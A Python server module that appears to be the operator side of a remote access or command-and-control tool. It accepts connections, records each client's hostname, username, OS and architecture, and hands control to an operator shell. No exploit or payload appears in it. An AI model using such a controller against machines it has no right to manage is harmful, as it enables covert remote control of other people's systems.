# src/server/core/server.py
import threading

from core import ClientSession
from core import Manager
from commands import Shell
from config import BANNER
from config import HeaderType as header
from rich import print
import time
import os

class Server:

    def __init__(self, transport, serializer):
        self.__session = None
        self.__transport = transport
        self.__serializer = serializer
        self.__manager = Manager
        self.__shell = Shell()
        self.__running = True

    def start(self):
        print(f"[bright_cyan]{BANNER}[/bright_cyan]")
        time.sleep(0.7)
        try:
            self.__transport.start()
        except Exception as e:
            print(f"[bright_red][!] Something went wrong. Cannot start server\n Error: {e}[/bright_red]")
            return

        shell_thread = threading.Thread(target=self.__shell.run)
        accept_thread = threading.Thread(target=self.accept_loop, daemon=True)

        shell_thread.start()
        accept_thread.start()

    def accept_loop(self):
        while self.__running:
            try:
                conn, addr = self.__transport.accept()
                if conn is not None and addr is not None:
                    print(f"[bright_green][+] New connection from {addr[0]}[/bright_green]")
                    client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                    client_thread.start()

            except KeyboardInterrupt as e:
                print(e)
                return


    def handle_client(self, client, addr):
        self.__session = ClientSession(client, self.__transport, self.__serializer)
        data = self.__session.receive_respone()
        if data is None:
            client.close()
            return

        if data['header'] == header.REGISTER:
            Server.handle_register(client, addr, data['data'])
            self.__session.send_request(header.ACK, 'ACK')
            print(f'[bright_green][+] Successfully registered [bright_cyan]{addr[0]}[bright_cyan][/bright_green]')
        else:
            print(f"[bright_cyan]From {addr[0]}:[/bright_cyan]\n ---> {data['data']}")


    def stop(self):
        while True:
            print("[bright_red][*] EXIT SERVER ? (y/n)[/bright_red]: ")
            confirm = input()
            if confirm.lower() == 'n':
                return
            elif confirm.lower() == 'y':
                self.__running = False
                print("[bright_red][!] Exiting server...[/bright_red]")
                time.sleep(0.5)
                try:
                    self.__manager.drop_all_clients()
                    self.__transport.stop()
                    print(f"[bright_green][+] Successfully exit server[/bright_green]")
                    return
                except Exception as e:
                    print(f"[bright_red][!] Something went wrong.\n Error {e}[/bright_red]")
                    os._exit(1)
            else:
                print("[bright_red][!] Invalid option. Please try again [/bright_red]")
                time.sleep(0.5)
                continue


    @staticmethod
    def handle_register(client, addr, data):
        uuid        = data['uuid']
        hostname    = data['hostname']
        username    = data['username']
        address     = addr
        conn        = client
        client_os   = f"{data['os']} {data['os_version']}"
        arch        = data['arch']

        Manager.add_client(uuid, hostname, username, address, conn, client_os, arch)